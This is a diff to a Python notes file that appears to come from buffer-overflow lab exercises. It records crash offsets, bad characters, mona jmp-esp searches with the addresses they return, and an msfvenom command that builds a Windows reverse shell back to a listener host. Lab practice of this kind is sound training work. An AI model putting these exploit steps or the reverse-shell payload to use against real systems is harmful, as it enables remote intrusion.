@@ -94,7 +94,7 @@ hex2bytes("625011AF")
 # \x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef
 
 # New ESP: 0x01A2FA30
-# !mona jmp -r esp -cpb "\x00\x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef"
+# !mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"
 
 # Result:
 # 0x62501203 : jmp esp |
@@ -105,3 +105,31 @@ hex2bytes("62501205")
 
 # Generate RevShell 
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=8888 EXITFUNC=thread -b "\x00\x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef" -f c
+
+# ------------------------------------------------------------------------------------------------------------------------------------------
+
+## Overflow 5
+
+# Fuzzing crashed at 2100 bytes
+
+# EIP contains normal pattern : 0x70433570 (offset 2026)
+# ESP: 0x019EFA30
+# Bad chars: 00 a9 aa cd ce d4 d5
+# \x00\xa9\xaa\xcd\xce\xd4\xd5
+
+# New ESP: 0x0192FA30
+# !mona jmp -r esp -cpb "\x00\xa9\xaa\xcd\xce\xd4\xd5"
+
+# Result
+#  625011AF     0x625011af : jmp esp |
+#  625011BB     0x625011bb : jmp esp |
+#  625011C7     0x625011c7 : jmp esp |
+#  625011D3     0x625011d3 : jmp esp |
+#  625011DF     0x625011df : jmp esp |
+#  625011EB     0x625011eb : jmp esp |
+#  625011F7     0x625011f7 : jmp esp |
+#  62501203     0x62501203 : jmp esp |
+#  62501205     0x62501205 : jmp esp |
+
+print("OVERFLOW4")
+hex2bytes("625011AF")
